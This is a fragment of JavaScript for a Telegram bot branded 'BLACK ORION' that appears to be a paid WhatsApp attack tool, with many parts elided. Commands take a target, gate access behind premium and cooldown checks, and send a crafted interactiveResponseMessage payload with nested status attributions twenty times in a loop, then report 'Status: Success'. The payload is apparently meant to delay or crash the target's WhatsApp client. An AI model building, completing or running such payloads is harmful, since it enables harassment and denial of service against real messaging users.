...
bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      ...
      const processMsg = await ctx.telegram.sendPhoto(
        ...
        { url: thumbnailUrl },
        {
          caption: `<pre><code class="language-javascript">⟡━⟢ BLACK ORION ⟣━⟡
⌑ Target: ${q}
...
╘═——————————————═⬡</code></pre>`,
      ...
      const finalText = `<pre><code class="language-javascript">⟡━⟢ BLACK ORION ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</code></pre>`
...
bot.command("BlckDelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  ...
  (async () => {
    for (let i = 0; i < 20; i++) {
      await sendInteractive(sock, mention = true)
      await sleep(1000);
    }
  })();
...
async function sendInteractive(sock, mention = true) {
  mention = sanitizeMentionList(mention)
  const message = {
  "interactiveResponseMessage": {
    "body": {
      "text": "",
    ...
    "nativeFlowResponseMessage": {
      "name": "menu_options",
      "paramsJson": "{\"display_text\":\"#  R 4 L D Z  #\",\"id\":\"R4\",\"description\":\"  \"}",
      "version": 3
    },
    "contextInfo": {
      ...
      "statusAttributions": [
        {
          ...
          "music": {
            "authorName": "LeicasR4",
            "songId": "0.9887830761010727",
            "title": "~ and it's all in vain",
            "author": "LeicasR4",
            "artistAttribution": "t.me/voidp",
            "isExplicit": true
          }
        },
        {
  ...
  return await sock.relayMessage("status@broadcast", message, {})
}
// END FUNCTION
// --- Jalankan Bot --- //
(async () => {
